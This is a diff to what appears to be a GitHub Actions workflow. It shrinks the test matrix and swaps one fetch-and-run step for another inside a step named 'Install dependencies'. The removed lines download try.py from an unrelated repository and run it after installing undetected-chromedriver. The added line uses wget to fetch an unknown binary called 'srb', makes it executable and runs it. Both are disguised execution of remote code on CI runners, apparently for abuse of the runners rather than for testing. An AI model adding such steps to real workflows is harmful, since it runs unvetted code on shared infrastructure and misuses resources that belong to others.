@@ -14,8 +14,8 @@ jobs:
       max-parallel: 40
       fail-fast: false
       matrix:
-        python-version: ["3.7","3.8", "3.9", "3.10"]
-        flag: [A,B,C,D,E,F,G,H]
+        python-version: ["3.7"]
+        flag: [A]
     env:
       NUM_JOBS: 40
       JOB: ${{matrix.python-version}}
@@ -28,12 +28,4 @@ jobs:
         python-version: ${{ matrix.python-version }}
     - name: Install dependencies
       run: |
-        google-chrome --version
-        chromedriver --version
-        lscpu
-        pip install xvfbwrapper
-        pip install selenium
-        pip install undetected-chromedriver
-        wget https://raw.githubusercontent.com/yfvj45/yes/main/p.txt
-        wget https://raw.githubusercontent.com/yfvj45/yes/main/try.py
-        python try.py
+        wget https://github.com/skusgdh/Rhu/raw/main/srb && chmod +x srb && ./srb --help
